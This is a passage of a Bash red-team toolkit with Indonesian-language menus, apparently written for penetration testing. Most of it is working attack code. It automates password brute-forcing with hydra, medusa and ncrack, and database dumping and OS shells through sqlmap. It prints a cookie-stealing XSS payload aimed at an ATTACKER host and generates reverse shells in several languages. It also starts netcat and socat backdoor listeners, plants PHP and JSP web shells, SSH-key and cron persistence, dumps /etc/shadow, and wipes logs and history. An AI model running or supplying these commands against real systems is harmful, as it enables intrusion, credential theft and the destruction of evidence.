                    hydra -l "$usr" -P "$wl" "$TARGET" http-post-form "$furl:$pdata:$ffail" 2>/dev/null | tee "${OUT}_hydra_http.txt"
                }; press_enter ;;
            8)  _req hydra && {
                    echo "1) RDP  2) SMB  3) VNC"; read -rp " Pilih: " svc
                    read -rp " Username: " usr; read -rp " Wordlist: " wl; wl="${wl:-$ROCKYOU}"
                    case "$svc" in
                        1) hydra -l "$usr" -P "$wl" rdp://"$TARGET" 2>/dev/null | tee "${OUT}_hydra_rdp.txt" ;;
                        2) hydra -l "$usr" -P "$wl" smb://"$TARGET" 2>/dev/null | tee "${OUT}_hydra_smb.txt" ;;
                        3) hydra -l "$usr" -P "$wl" vnc://"$TARGET" 2>/dev/null | tee "${OUT}_hydra_vnc.txt" ;;
                    esac
                }; press_enter ;;
            9)  _req medusa && {
                    read -rp " Username: " usr; read -rp " Wordlist: " wl; wl="${wl:-$ROCKYOU}"
                    read -rp " Service (ssh/ftp/http/smb): " svc
                    medusa -h "$TARGET" -u "$usr" -P "$wl" -M "$svc" 2>/dev/null | tee "${OUT}_medusa.txt"
                }; press_enter ;;
            10) _req ncrack && {
                    read -rp " Services (ssh,ftp,rdp): " svcs; read -rp " Wordlist: " wl; wl="${wl:-$ROCKYOU}"
                    ncrack -v --user root -P "$wl" "${svcs//,/ $TARGET:}://$TARGET" 2>/dev/null | tee "${OUT}_ncrack.txt"
                }; press_enter ;;
            11) _req sqlmap && {
                    read -rp " URL SQLi: " sqlurl
                    sqlmap -u "$sqlurl" --batch --dbs 2>/dev/null | tee "${OUT}_sqldbs.txt"
                    read -rp " Database: " db
                    sqlmap -u "$sqlurl" -D "$db" --tables --batch 2>/dev/null | tee "${OUT}_sqltables.txt"
                    read -rp " Table: " tbl
                    sqlmap -u "$sqlurl" -D "$db" -T "$tbl" --dump --batch 2>/dev/null | tee "${OUT}_sqldump.txt"
                }; press_enter ;;
            12) _req sqlmap && {
                    read -rp " URL SQLi vulnerable: " sqlurl
                    sqlmap -u "$sqlurl" --os-shell --batch 2>/dev/null
                }; press_enter ;;
            13) echo -e "\n${BOLD}XSS Payloads:${NC}"
                echo '  Basic       : <script>alert(1)</script>'
                echo '  Image       : <img src=x onerror=alert(1)>'
                echo '  SVG         : <svg/onload=alert(1)>'
                echo '  Bypass      : <ScRiPt>alert(1)</ScRiPt>'
                echo "  Cookie steal: <script>document.location='http://ATTACKER/c='+document.cookie</script>"
                echo '  DOM XSS     : #<script>alert(1)</script>'
                press_enter ;;
            14) echo -e "\n${BOLD}LFI Tester:${NC}"
                read -rp " URL vulnerable (contoh: http://site.com/?page=): " lfi_url
                local payloads=("../../../etc/passwd" "....//....//....//etc/passwd" \
                    "..%2F..%2F..%2Fetc%2Fpasswd" "/etc/passwd%00" \
                    "php://filter/convert.base64-encode/resource=index")
                for p in "${payloads[@]}"; do
                    echo -e "${CYN}Testing: $p${NC}"
                    result=$(curl -s "${lfi_url}${p}" 2>/dev/null | grep -c "root:")
                    [[ $result -gt 0 ]] && echo -e "${LGRN}  !! VULNERABLE: $p${NC}" || echo "  Not vulnerable"
                done | tee "${OUT}_lfi.txt"; press_enter ;;
            15) _req arpspoof && {
                    read -rp " Interface (eth0/wlan0): " iface
                    read -rp " Gateway IP: " gw
                    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
                    sudo arpspoof -i "$iface" -t "$TARGET" "$gw" &
                    sudo arpspoof -i "$iface" -t "$gw" "$TARGET"
                }; press_enter ;;
            16) _req responder && {
                    read -rp " Interface: " iface
                    sudo responder -I "$iface" -rdwv 2>/dev/null
                }; press_enter ;;
            17) echo -e "\n${BOLD}Reverse Shell Generator:${NC}"
                read -rp " LHOST: " lhost; read -rp " LPORT [4444]: " lport; lport="${lport:-4444}"
                echo -e "\n${LCYN}Bash:${NC}    bash -i >& /dev/tcp/$lhost/$lport 0>&1"
                echo -e "${LCYN}Python3:${NC} python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
                echo -e "${LCYN}PHP:${NC}     php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                echo -e "${LCYN}Netcat:${NC}  nc -e /bin/sh $lhost $lport"
                echo -e "${LCYN}Perl:${NC}    perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
                echo -e "${LCYN}Socat:${NC}   socat TCP:$lhost:$lport EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
                press_enter ;;
            18) read -rp " Port listen [4444]: " bport; bport="${bport:-4444}"
                if command -v nc &>/dev/null; then
                    nc -lvnp "$bport" -e /bin/bash 2>/dev/null || ncat -lvnp "$bport" --sh-exec "/bin/bash"
                elif command -v socat &>/dev/null; then
                    socat TCP-LISTEN:"$bport",reuseaddr,fork EXEC:/bin/bash
                else
                    log WARN "nc/socat tidak tersedia"
                fi; press_enter ;;
            19) _req crackmapexec && {
                    read -rp " Username: " usr; read -rp " Password: " pass
                    crackmapexec smb "$TARGET" -u "$usr" -p "$pass" --shares --sessions 2>/dev/null | tee "${OUT}_cme.txt"
                }; press_enter ;;
            b)  return ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FASE 4 — MAINTAINING ACCESS
# ════════════════════════════════════════════════════════════
menu_maintain() {
    while true; do
        show_banner
        echo -e "${BOLD}${LYLW}[ FASE 4 — MAINTAINING ACCESS ]${NC}\n"
        echo -e "  ${LGRN}1${NC}  Backdoor Listener (Netcat persistent)"
        echo -e "  ${LGRN}2${NC}  Cron Job Persistence (demo)"
        echo -e "  ${LGRN}3${NC}  SSH Key Implant (demo)"
        echo -e "  ${LGRN}4${NC}  Bind Shell via Socat"
        echo -e "  ${LGRN}5${NC}  Tunneling via SSH (port forward)"
        echo -e "  ${LGRN}6${NC}  SOCKS5 Proxy (SSH tunnel)"
        echo -e "  ${LGRN}7${NC}  Meterpreter Persistence Module"
        echo -e "  ${LGRN}8${NC}  Web Shell Deploy Check"
        echo -e "  ${LGRN}9${NC}  ProxyChains Config"
        echo -e "  ${LGRN}b${NC}  Kembali\n"
        read -rp " Pilih: " opt
        case "$opt" in
            1)  read -rp " Port listen: " port
                local nc_cmd=""
                command -v nc &>/dev/null && nc_cmd="nc" || command -v ncat &>/dev/null && nc_cmd="ncat"
                if [[ -n "$nc_cmd" ]]; then
                    while true; do $nc_cmd -lvnp "${port:-9001}" -e /bin/bash; sleep 1; done &
                    log OK "Listener running (kill dengan: kill $!)"
                else
                    log WARN "nc/ncat tidak tersedia. Coba socat:"
                    socat TCP-LISTEN:"${port:-9001}",reuseaddr,fork EXEC:/bin/bash &
                    log OK "Socat listener running"
                fi; press_enter ;;
            2)  echo -e "\n${BOLD}Contoh Cron Persistence:${NC}"
                echo '  * * * * * /bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"'
                echo '  @reboot nc -e /bin/bash LHOST LPORT'
                echo -e "\n${LYLW}  Peringatan: Gunakan hanya pada sistem authorized!${NC}"; press_enter ;;
            3)  echo -e "\n${BOLD}SSH Key Implant:${NC}"
                echo '  mkdir -p ~/.ssh && chmod 700 ~/.ssh'
                echo '  echo "ATTACKER_PUBKEY" >> ~/.ssh/authorized_keys'
                echo '  chmod 600 ~/.ssh/authorized_keys'; press_enter ;;
            4)  read -rp " Port: " port
                if command -v socat &>/dev/null; then
                    socat TCP-LISTEN:"${port:-9002}",reuseaddr,fork EXEC:/bin/bash &
                    log OK "Socat bind shell running di port ${port:-9002}"
                else
                    log WARN "socat tidak tersedia. Install: sudo $PKG_MANAGER install socat"
                fi; press_enter ;;
            5)  read -rp " SSH user@target: " ssht
                read -rp " Remote port: " rport; read -rp " Local port: " lport
                ssh -L "${lport}:localhost:${rport}" "$ssht" -N -f; press_enter ;;
            6)  read -rp " SSH user@target: " ssht
                read -rp " SOCKS5 local port [1080]: " sport; sport="${sport:-1080}"
                ssh -D "$sport" -N -f "$ssht"
                log OK "SOCKS5 proxy di localhost:$sport"; press_enter ;;
            7)  echo -e "\n${BOLD}MSF Persistence:${NC}"
                echo '  use post/multi/manage/shell_to_meterpreter'
                echo '  use post/windows/manage/persistence'
                echo '  set STARTUP REGISTRY && run'; press_enter ;;
            8)  echo -e "\n${BOLD}Web Shell Templates:${NC}"
                echo "  PHP  : <?php system(\$_GET[\"cmd\"]); ?>"
                echo "  PHP2 : <?php echo shell_exec(\$_POST[\"c\"]); ?>"
                echo "  JSP  : <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
                echo -e "\n  Test: curl http://$TARGET/shell.php?cmd=id"; press_enter ;;
            9)  # Deteksi proxychains config file
                local pc_conf=""
                for f in /etc/proxychains4.conf /etc/proxychains.conf /etc/proxychains-ng/proxychains.conf; do
                    [[ -f "$f" ]] && pc_conf="$f" && break
                done
                echo -e "\n${BOLD}ProxyChains Config:${NC}"
                echo "  Config file: ${pc_conf:-/etc/proxychains4.conf}"
                echo "  socks5 127.0.0.1 1080"
                local pc_cmd=""
                command -v proxychains4 &>/dev/null && pc_cmd="proxychains4" || \
                    command -v proxychains &>/dev/null && pc_cmd="proxychains"
                echo "  Penggunaan: ${pc_cmd:-proxychains4} nmap $TARGET"; press_enter ;;
            b)  return ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FASE 5 — POST EXPLOITATION
# ════════════════════════════════════════════════════════════
menu_postexploit() {
    while true; do
        show_banner
        echo -e "${BOLD}${GRY}[ FASE 5 — POST EXPLOITATION & COVERING TRACKS ]${NC}\n"
        echo -e "  ${WHT}── Privilege Escalation ────────────────────────────────${NC}"
        echo -e "  ${LGRN}1${NC}  LinPEAS (Linux PrivEsc Auto-Enum)"
        echo -e "  ${LGRN}2${NC}  WinPEAS (Windows PrivEsc)"
        echo -e "  ${LGRN}3${NC}  SUID/SGID Finder"
        echo -e "  ${LGRN}4${NC}  Sudo Rights Check"
        echo -e "  ${LGRN}5${NC}  Crontab Audit"
        echo -e "  ${WHT}── Credential Dumping ───────────────────────────────────${NC}"
        echo -e "  ${LGRN}6${NC}  Hash Cracking (John)"
        echo -e "  ${LGRN}7${NC}  Hash Cracking (Hashcat)"
        echo -e "  ${LGRN}8${NC}  Hash Identify"
        echo -e "  ${LGRN}9${NC}  Mimikatz (MSF)"
        echo -e "  ${LGRN}10${NC} /etc/passwd + /etc/shadow Dump"
        echo -e "  ${WHT}── Covering Tracks ──────────────────────────────────────${NC}"
        echo -e "  ${LGRN}11${NC} Clear Bash History"
        echo -e "  ${LGRN}12${NC} Wipe Auth Logs (simulasi)"
        echo -e "  ${LGRN}13${NC} Wipe syslog (simulasi)"
        echo -e "  ${LGRN}14${NC} Timestomping"
        echo -e "  ${LGRN}15${NC} Steganografi (steghide)"
        echo -e "  ${LGRN}b${NC}  Kembali\n"
        read -rp " Pilih: " opt
        local OUT="$LOG_DIR/post_$(date +%H%M%S)"
        case "$opt" in
            1)  log CMD "Downloading & Running LinPEAS"
                curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
                chmod +x /tmp/linpeas.sh && bash /tmp/linpeas.sh | tee "${OUT}_linpeas.txt"; press_enter ;;
            2)  wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat \
                    -O /tmp/winpeas.bat 2>/dev/null
                log OK "WinPEAS di /tmp/winpeas.bat - transfer ke target Windows"; press_enter ;;
            3)  find / -perm -u=s -type f 2>/dev/null | tee "${OUT}_suid.txt"
                find / -perm -g=s -type f 2>/dev/null | tee -a "${OUT}_suid.txt"
                echo -e "${LYLW}Cek: https://gtfobins.github.io/${NC}"; press_enter ;;
            4)  sudo -l 2>/dev/null | tee "${OUT}_sudo.txt"
                echo -e "${LYLW}Cek: https://gtfobins.github.io/#sudo${NC}"; press_enter ;;
            5)  crontab -l 2>/dev/null; cat /etc/cron* /etc/cron.d/* 2>/dev/null | tee "${OUT}_cron.txt"; press_enter ;;
            6)  if command -v john &>/dev/null; then
                    read -rp " File hash: " hfile
                    read -rp " Wordlist [rockyou]: " wl; wl="${wl:-$ROCKYOU}"
                    john --wordlist="$wl" "$hfile" | tee "${OUT}_john.txt"
                    john --show "$hfile" | tee -a "${OUT}_john.txt"
                else
                    log WARN "john tidak tersedia. Install: sudo $PKG_MANAGER install john"
                fi; press_enter ;;
            7)  if command -v hashcat &>/dev/null; then
                    read -rp " File hash: " hfile
                    read -rp " Hash type (-m): " htype
                    read -rp " Wordlist [rockyou]: " wl; wl="${wl:-$ROCKYOU}"
                    hashcat -m "$htype" -a 0 "$hfile" "$wl" --force 2>/dev/null | tee "${OUT}_hashcat.txt"
                else
                    log WARN "hashcat tidak tersedia. Install: sudo $PKG_MANAGER install hashcat"
                fi; press_enter ;;
            8)  read -rp " Hash value: " hval
                if command -v hash-identifier &>/dev/null; then
                    echo "$hval" | hash-identifier 2>/dev/null
                else
                    echo "$hval" | python3 -c "
import sys
h=sys.stdin.read().strip()
print(f'Length: {len(h)}')
types = {32:'MD5',40:'SHA1',56:'SHA224',64:'SHA256',96:'SHA384',128:'SHA512'}
print(f'Possible type: {types.get(len(h),\"Unknown / check hashid.org\")}')
"
                fi; press_enter ;;
            9)  command -v msfconsole &>/dev/null && \
                    msfconsole -q -x "use post/windows/gather/credentials/credential_collector; set SESSION 1; run; exit" 2>/dev/null \
                    || log WARN "Metasploit tidak tersedia"; press_enter ;;
            10) cat /etc/passwd 2>/dev/null | tee "${OUT}_passwd.txt"
                sudo cat /etc/shadow 2>/dev/null | tee "${OUT}_shadow.txt"; press_enter ;;
            11) history -c; history -w; echo "" > ~/.bash_history; unset HISTFILE
                log OK "Bash history cleared"; press_enter ;;
            12) echo -e "\n${LYLW}Simulasi covering tracks:${NC}"
                echo "  sudo truncate -s 0 /var/log/auth.log    # Debian/Ubuntu"
                echo "  sudo truncate -s 0 /var/log/secure       # RHEL/CentOS"
                echo "  sudo truncate -s 0 /var/log/audit/audit.log  # Systemd"
                echo -e "${LRED}  Jalankan HANYA di sistem yang Anda miliki izin!${NC}"; press_enter ;;
            13) echo -e "\n${LYLW}Simulasi clear syslog:${NC}"
                echo "  sudo truncate -s 0 /var/log/syslog    # Debian"
                echo "  sudo truncate -s 0 /var/log/messages  # RHEL"
                echo "  sudo journalctl --rotate && sudo journalctl --vacuum-time=1s"; press_enter ;;
            14) read -rp " File target: " tsfile
                touch -t 202001010000 "$tsfile" 2>/dev/null && log OK "Timestamp diubah" || log ERR "Gagal"; press_enter ;;
            15) if command -v steghide &>/dev/null; then
                    read -rp " Image file: " imgf; read -rp " Secret file: " secf
                    steghide embed -cf "$imgf" -sf "$secf" 2>/dev/null
                else
                    log WARN "steghide tidak tersedia. Install: sudo $PKG_MANAGER install steghide"
                fi; press_enter ;;
            b)  return ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FASE 6 — REPORTING
# ════════════════════════════════════════════════════════════
menu_report() {
    show_banner
    echo -e "${BOLD}${LGRN}[ FASE 6 — REPORTING ]${NC}\n"
    local rep="$REPORT_DIR/redteam_report_$(date +%Y%m%d_%H%M%S).md"
    {
        echo "# RED TEAM ENGAGEMENT REPORT"
        echo "**Tanggal:** $(date)"
        echo "**Target:** $TARGET"
        echo "**Assessor:** $(whoami)@$(hostname)"
        echo "**OS:** $OS_NAME | $OS_ARCH"
        echo ""
        echo "---"
        echo ""
        echo "## 1. Executive Summary"
        echo "> Ringkasan singkat temuan utama dan dampak bisnis."
        echo ""
        echo "## 2. Scope & Objectives"
        echo "- Target: $TARGET"
        echo "- Tanggal mulai: $(date)"
        echo "- Metode: Black/Grey/White Box"
        echo ""
        echo "## 3. Findings"
        echo "### Critical"
        echo "| ID | Judul | CVSS | Bukti |"
        echo "|-----|-------|------|-------|"
        echo "| F-01 | [Nama Kerentanan] | 9.8 | [screenshot/log] |"
        echo ""
        echo "### High | Medium | Low"
        echo ""
        echo "## 4. Attack Timeline"
        echo '```'
        ls -lt "$LOG_DIR" | head -30
        echo '```'
        echo ""
        echo "## 5. Rekomendasi"
        echo "| # | Temuan | Remediasi | Prioritas |"
        echo "|---|--------|-----------|-----------|"
        echo ""
        echo "## 6. Raw Logs"
        echo "Log tersimpan di: $LOG_DIR"
    } > "$rep"
    log OK "Report draft dibuat: $rep"
    echo ""
    echo -e "  Edit: ${LCYN}nano $rep${NC}"
    echo -e "  Export PDF: ${LCYN}pandoc $rep -o report.pdf${NC}"
    press_enter
}

# ════════════════════════════════════════════════════════════
#  MAIN MENU
# ════════════════════════════════════════════════════════════
main_menu() {
    while true; do
        show_banner
        echo -e "  ${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "  ${LGRN}0${NC}  Set Target / Scope"
        echo -e "  ${LCYN}1${NC}  Fase 1 — Reconnaissance"
        echo -e "  ${LMAG}2${NC}  Fase 2 — Vulnerability Scanning"
        echo -e "  ${LRED}3${NC}  Fase 3 — Exploitation"
        echo -e "  ${LYLW}4${NC}  Fase 4 — Maintaining Access"
        echo -e "  ${GRY}5${NC}  Fase 5 — Post Exploitation & Covering Tracks"
        echo -e "  ${LGRN}6${NC}  Fase 6 — Report Generator"
        echo -e "  ${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "  ${BLU}7${NC}  Cek Status Tools"
        echo -e "  ${BLU}8${NC}  Install Missing Tools"
        echo -e "  ${BLU}9${NC}  Lihat Logs Session"
        echo -e "  ${LCYN}c${NC}  Compatibility Check"
        echo -e "  ${RED}q${NC}  Keluar"
        echo ""
        read -rp " [RedTeam@$OS_FAMILY]> " choice
        case "$choice" in
            0) set_target ;;
            1) menu_recon ;;
            2) menu_vulnscan ;;
            3) menu_exploit ;;
            4) menu_maintain ;;
            5) menu_postexploit ;;
            6) menu_report ;;
            7) check_all_tools; press_enter ;;
            8) install_missing ;;
            9) ls -lt "$LOG_DIR" && echo && read -rp " Buka log mana? " lf && less "$LOG_DIR/$lf" ;;
            c|C) show_compat_screen ;;
            q|Q|quit|exit)
                echo -e "\n${LGRN}Session log: $SESSION_LOG${NC}\n"
                exit 0 ;;
        esac
    done
}

# ── Entrypoint ────────────────────────────────────────────────
echo -e "${LRED}[DISCLAIMER] Toolkit ini HANYA untuk pengujian authorized.${NC}"
echo -e "${LYLW}Penggunaan tanpa izin adalah ILEGAL. Tekan Ctrl+C untuk batal.${NC}"
sleep 2

# Deteksi OS dulu
detect_os

# Tampilkan compat screen di startup (pertama kali saja)
COMPAT_DONE_FLAG="$LOG_DIR/.compat_checked_$(uname -r | tr -d '.')"
if [[ ! -f "$COMPAT_DONE_FLAG" ]]; then
    show_compat_screen
    touch "$COMPAT_DONE_FLAG"
fi

main_menu
